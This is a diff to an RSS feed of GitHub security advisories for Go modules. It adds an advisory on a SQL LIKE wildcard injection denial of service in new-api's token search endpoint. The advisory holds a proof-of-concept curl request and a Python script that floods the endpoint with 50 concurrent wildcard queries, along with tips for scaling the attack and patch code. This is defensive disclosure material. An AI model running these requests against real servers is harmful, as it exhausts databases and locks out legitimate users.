@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-02-23T21:06:53.144Z</updated>
+    <updated>2026-02-23T21:58:12.912Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,165 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/QuantumNous/new-api] New API has an SQL LIKE Wildcard Injection DoS via Token Search]]></title>
+        <id>https://github.com/advisories/GHSA-w6x6-9fp7-fqm4</id>
+        <link href="https://github.com/advisories/GHSA-w6x6-9fp7-fqm4"/>
+        <updated>2026-02-23T21:56:51.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A SQL LIKE wildcard injection vulnerability in the <code>/api/token/search</code> endpoint allows authenticated users to cause Denial of Service through resource exhaustion by crafting malicious search patterns.</p>
+<h3 id="details">Details</h3>
+<p>The token search endpoint accepts user-supplied <code>keyword</code> and <code>token</code> parameters that are directly concatenated into SQL LIKE clauses without escaping wildcard characters (<code>%</code>, <code>_</code>). This allows attackers to inject patterns that trigger expensive database queries.</p>
+<h3 id="vulnerable-code">Vulnerable Code</h3>
+<p>File: <code>model/token.go:70</code></p>
+<pre><code class="language-go">err = DB.Where("user_id = ?", userId).
+       Where("name LIKE ?", "%"+keyword+"%").     // No wildcard escaping
+       Where(commonKeyCol+" LIKE ?", "%"+token+"%").
+       Find(&amp;tokens).Error
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>After creating over 2 million tokens, creating millions token entries is not difficult, because the rate limiting only applies to IP addresses, so multiple IP addresses can share one session, allowing for the creation of an unlimited number of tokens in batches.</p>
+<img src="https://github.com/user-attachments/assets/55e63dcd-884d-41bc-9bea-4300ba1b50c6" alt="image" height="659" width="1636">
+
+<p>These data are not all loaded at once under normal circumstances, as shown in the image, and are displayed correctly. But if a request like this is submitted:</p>
+<pre><code class="language-bash"># A single request causes PostgreSQL to unconditionally retrieve all tokens belonging to that user. These requests buffer will all go into the buffer zone, causing an overflow and preventing the program from functioning properly.
+curl 'http://localhost:3000/api/token/search?keyword=%&amp;token='
+</code></pre>
+<img src="https://github.com/user-attachments/assets/c31d9639-3550-4e93-8735-fba068f56124" alt="image" height="350" width="491">
+
+<p>It will cause DoS.</p>
+<pre><code class="language-python">import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def attack(session_cookie):
+    requests.get(
+        'http://localhost:3000/api/token/search',
+        params={'keyword': '%_%_%_%_%_%', 'token': ''},
+        cookies={'session': session_cookie},
+        headers={'New-API-User': '1'}
+    )
+
+# Launch 50 concurrent malicious requests
+with ThreadPoolExecutor(max_workers=50) as executor:
+    for _ in range(50):
+        executor.submit(attack, '&lt;valid_session&gt;')
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p><strong>Availability</strong></p>
+<p>RAM Overflow</p>
+<img src="https://github.com/user-attachments/assets/c0bb5159-6943-42bd-a9f4-5c60c57fb149" alt="image" height="145" width="1078">
+
+<p>Postgres unavailable</p>
+<img src="https://github.com/user-attachments/assets/245e4f59-0ec5-4f9b-a839-3c9bb61be14b" alt="image" height="185" width="772">
+
+<ul>
+<li>Database CPU usage spike to 100%</li>
+<li>Application memory exhaustion</li>
+<li>Legitimate user requests blocked or significantly delayed</li>
+<li>Potential application crash or database connection pool exhaustion</li>
+</ul>
+<h3 id="database-performance">Database Performance</h3>
+<p>Testing with 2,000,000 tokens:</p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Query Time</th>
+<th>Rows</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>test</code> (normal)</td>
+<td>~50ms</td>
+<td>0</td>
+<td>Low</td>
+</tr>
+<tr>
+<td><code>%</code> (full scan)</td>
+<td>5,973ms</td>
+<td>2,000,000</td>
+<td>High</td>
+</tr>
+<tr>
+<td><code>%_%_%_%_%_%</code></td>
+<td>6,200ms+</td>
+<td>2,000,000</td>
+<td>Very High</td>
+</tr>
+</tbody></table>
+<h3 id="attack-scalability">Attack Scalability</h3>
+<ul>
+<li><strong>Single attacker</strong>: Can launch 10-50 concurrent requests easily</li>
+<li><strong>Multiple accounts</strong>: Attacker can register multiple accounts (if registration enabled)</li>
+<li><strong>Proxy rotation</strong>: IP-based rate limiting can be bypassed</li>
+<li><strong>Persistence</strong>: Attack can be sustained indefinitely</li>
+</ul>
+<h3 id="resource-consumption">Resource Consumption</h3>
+<p>Each malicious request with 2M results:</p>
+<ul>
+<li><strong>Database</strong>: ~6 seconds CPU time</li>
+<li><strong>Network</strong>: ~200MB data transfer</li>
+<li><strong>Application Memory</strong>: ~200MB+ for JSON serialization</li>
+<li><strong>Connection Time</strong>: Database connection held for entire query duration</li>
+</ul>
+<h2 id="exploitation-scenario">Exploitation Scenario</h2>
+<ol>
+<li>Attacker registers or compromises a regular user account</li>
+<li>Attacker crafts malicious LIKE patterns using <code>%</code> wildcards</li>
+<li>Attacker launches concurrent requests (50-200 concurrent)</li>
+<li>Database becomes overwhelmed with slow queries</li>
+<li>Application memory exhausts from processing large result sets</li>
+<li>Legitimate users experience service degradation or complete unavailability</li>
+</ol>
+<h2 id="patch-recommendations">Patch Recommendations</h2>
+<h3 id="1-escape-like-wildcards-critical">1. Escape LIKE Wildcards (Critical)</h3>
+<pre><code class="language-go">func escapeLike(s string) string {
+    s = strings.ReplaceAll(s, "\\", "\\\\")
+    s = strings.ReplaceAll(s, "%", "\\%")
+    s = strings.ReplaceAll(s, "_", "\\_")
+    return s
+}
+
+func SearchUserTokens(userId int, keyword string, token string) (tokens []*Token, err error) {
+    keyword = escapeLike(keyword)
+    token = strings.Trim(token, "sk-")
+    token = escapeLike(token)
+
+    err = DB.Where("user_id = ?", userId).
+           Where("name LIKE ? ESCAPE '\\\\'", "%"+keyword+"%").
+           Where(commonKeyCol+" LIKE ? ESCAPE '\\\\'", "%"+token+"%").
+           Limit(1000).
+           Find(&amp;tokens).Error
+    return tokens, err
+}
+</code></pre>
+<h3 id="2-add-user-level-rate-limiting">2. Add User-Level Rate Limiting</h3>
+<pre><code class="language-go">tokenRoute.GET("/search",
+    middleware.TokenSearchRateLimit(),  // 30 req/min per user
+    controller.SearchTokens)
+</code></pre>
+<h3 id="3-add-query-timeout">3. Add Query Timeout</h3>
+<pre><code class="language-go">ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+defer cancel()
+err = DB.WithContext(ctx).Where(...).Find(&amp;tokens).Error
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/QuantumNous/new-api/security/advisories/GHSA-w6x6-9fp7-fqm4">https://github.com/QuantumNous/new-api/security/advisories/GHSA-w6x6-9fp7-fqm4</a></li>
+<li><a href="https://github.com/QuantumNous/new-api/commit/3e1be18310f35d20742683ca9e4bf3bcafc173c5">https://github.com/QuantumNous/new-api/commit/3e1be18310f35d20742683ca9e4bf3bcafc173c5</a></li>
+<li><a href="https://github.com/QuantumNous/new-api/releases/tag/v0.10.8-alpha.10">https://github.com/QuantumNous/new-api/releases/tag/v0.10.8-alpha.10</a></li>
+<li><a href="https://github.com/advisories/GHSA-w6x6-9fp7-fqm4">https://github.com/advisories/GHSA-w6x6-9fp7-fqm4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w6x6-9fp7-fqm4</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-23T21:56:47.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik affected by TLS ClientAuth Bypass on HTTP/3]]></title>
         <id>https://github.com/advisories/GHSA-gv8r-9rw9-9697</id>
@@ -538,28 +697,6 @@ ip -6 route add default dev cilium_net table 300
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-02-16T15:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost fails to sanitize sensitive data in WebSocket messages]]></title>
-        <id>https://github.com/advisories/GHSA-pp9j-pf5c-659x</id>
-        <link href="https://github.com/advisories/GHSA-pp9j-pf5c-659x"/>
-        <updated>2026-02-19T19:35:13.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.1.x &lt;= 11.1.2, 10.11.x &lt;= 10.11.9, 11.2.x &lt;= 11.2.1 fail to sanitize sensitive data in WebSocket messages which allows authenticated users to exfiltrate password hashes and MFA secrets via profile nickname updates or email verification events. Mattermost Advisory ID: MMSA-2025-00560</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-13821">https://nvd.nist.gov/vuln/detail/CVE-2025-13821</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/cd17b61de41bf0a49b524bb91ce0bbe859e5a100">https://github.com/mattermost/mattermost/commit/cd17b61de41bf0a49b524bb91ce0bbe859e5a100</a></li>
-<li><a href="https://github.com/advisories/GHSA-pp9j-pf5c-659x">https://github.com/advisories/GHSA-pp9j-pf5c-659x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pp9j-pf5c-659x</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-02-16T12:30:25.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost fails to sanitize sensitive data in WebSocket messages]]></title>
